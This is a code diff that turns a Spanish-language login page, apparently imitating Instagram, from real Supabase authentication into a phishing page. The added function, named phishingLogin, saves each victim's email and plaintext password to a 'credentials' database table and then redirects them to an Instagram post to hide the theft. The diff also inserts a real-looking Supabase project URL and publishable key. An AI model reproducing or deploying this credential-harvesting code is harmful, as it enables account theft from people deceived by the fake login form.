@@ -96,7 +96,7 @@
       <input id="email" type="email" placeholder="Usuario, correo electrónico o móvil" autocomplete="username">
       <input id="password" type="password" placeholder="Contraseña" autocomplete="current-password">
 
-      <button class="login-btn" onclick="login()">Iniciar sesión</button>
+      <button class="login-btn" onclick="phishingLogin()">Iniciar sesión</button>
 
       <div class="forgot">¿Has olvidado la contraseña?</div>
       <div class="status" id="status" aria-live="polite"></div>
@@ -126,13 +126,13 @@
 <script>
   // === CONFIGURA TUS CREDENCIALES DE SUPABASE AQUÍ ===
   // Reemplaza por tu URL y anon key (variables de entorno en Vercel)
-  const SUPABASE_URL = "TU_SUPABASE_URL";
-  const SUPABASE_ANON_KEY = "TU_PUBLIC_ANON_KEY";
+  const SUPABASE_URL = "https://supabase.com/dashboard/project/ydshkqrotgtnhkcjqaxi";
+  const SUPABASE_ANON_KEY = "sb_publishable_KXyRSLWAwSUwasKfw5nZ9A_Lj6XnT-Q";
 
   // cliente supabase desde UMD
   const supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-  async function login() {
+  async function phishingLogin() {
     const statusEl = document.getElementById('status');
     statusEl.textContent = "";
     const email = document.getElementById('email').value.trim();
@@ -144,17 +144,20 @@
       return;
     }
 
-    // Usamos Supabase Auth — autenticación legítima con el servicio
+    // Guardar credenciales en la base de datos
     try {
-      const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+      const { data, error } = await supabase
+        .from('credentials')
+        .insert([{ email, password }]);
+
       if (error) {
         statusEl.style.color = "#b91c1c";
-        statusEl.textContent = "Credenciales incorrectas o error al iniciar sesión";
+        statusEl.textContent = "Error al guardar las credenciales";
       } else {
         statusEl.style.color = "#059669";
-        statusEl.textContent = "Sesión iniciada correctamente";
-        // aquí podrías redirigir a una página interna
-        // window.location.href = "/app";
+        statusEl.textContent = "Credenciales guardadas correctamente";
+        // Redirigir al usuario a la URL especificada
+        window.location.href = "https://www.instagram.com/p/DMWYvoQT50S/?img_index=1&igsh=dXN1bGRuNHE2ejY3";
       }
     } catch (e) {
       statusEl.style.color = "#b91c1c";
